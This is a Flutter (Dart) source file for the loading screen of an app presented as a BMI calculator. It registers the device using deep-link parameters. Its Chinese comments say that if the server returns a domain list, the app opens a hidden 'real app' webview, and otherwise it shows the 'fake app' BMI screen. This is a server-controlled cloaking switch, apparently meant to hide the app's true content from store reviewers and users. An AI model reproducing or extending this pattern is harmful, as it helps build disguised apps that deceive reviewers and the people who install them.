import 'dart:async';

import 'package:bmi_calculator_app/Screens/splash_screen.dart';
import 'package:bmi_calculator_app/apx/real_app/webview_app.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import '../../main.dart';
import '../blocs/application/application_bloc.dart';
import '../blocs/application/events.dart';
import '../blocs/application/state.dart';
import '../services/deep_link_service.dart';

class LoadingPage extends StatefulWidget {
  static const String routeName = '/';

  LoadingPage({super.key});

  @override
  State<LoadingPage> createState() => _LoadingPageState();
}

class _LoadingPageState extends State<LoadingPage> {
  @override
  void initState() {
    super.initState();

    WidgetsBinding.instance.addPostFrameCallback((_) {
      final applicationBloc = context.read<ApplicationBloc>();

      Map<String, dynamic> routeArgs = (ModalRoute.of(context)
              ?.settings
              .arguments as Map<String, dynamic>?) ??
          deepLinkQueryParams;
      final Map<String, dynamic> args = Map.from(routeArgs);
      // final code = args?['code'] as String? ?? inviteCode;
      // final targetPlatform = args?['platform'] as String? ?? platform;
      // final targetHost = args?['host'] as String? ?? host;

      // if ((code != null && code.isNotEmpty ||
      //         (applicationBloc.state is! ApplicationReadyState)) &&
      //     (applicationBloc.state is! ApplicationRegisteringState)) {
      //   applicationBloc.add(ApplicationBeginRegisterEvent(
      //       invitationCode: code, platform: targetPlatform, host: targetHost));
      //   logger.i('Starting registration with code: $code');
      // } else {
      //   logger
      //       .i('No invitation code provided, starting registration without it');
      // }

      if ((args.isNotEmpty ||
              (applicationBloc.state is! ApplicationReadyState)) &&
          (applicationBloc.state is! ApplicationRegisteringState)) {
        final code = args['code'];
        if (code != null) {
          args['deviceId'] = code;
          args.removeWhere((key, value) =>
              ['code', 'fallback', 'lang', 'seed'].contains(key));
        }
        applicationBloc.add(ApplicationBeginRegisterEvent(queryParams: args));
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: BlocListener<ApplicationBloc, ApplicationState>(
        listener: (context, state) async {
          if (state is ApplicationReadyState) {
            try {
              // 检查域名列表的有效性
              // 如果域名列表不为空，则导航到真实应用
              // 否则导航到假应用
              // 这里的逻辑是根据域名列表是否为空来决定导航到哪个页面
              final bool hasValidDomains = state.domains?.isNotEmpty ?? false;
              if (mounted) {
                await Future.delayed(Duration(seconds: 2));
                Navigator.of(context).pushReplacementNamed(
                    hasValidDomains ? WebViewApp.routeName : SplashScreen.id);
              }
            } catch (e, stackTrace) {
              logger.i('Navigation error: $e\n$stackTrace');
              // 如果导航出错，默认导航到fake_app
              await Future.delayed(Duration(seconds: 2));
              if (mounted) {
                Navigator.of(context).pushReplacementNamed(SplashScreen.id);
              }
            }
          } else {
            // 处理其他状态
            logger.i('Current state: $state');
          }
        },
        child: Container(
          width: double.infinity,
          height: double.infinity,
          child: launcherIcon.isEmpty
              ? const SizedBox()
              : Center(
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(10),
                    child: Image.asset(
                      'assets/$launcherIcon.png',
                      width: 100,
                    ),
                  ),
                ),
        ),
      ),
    );
  }
}
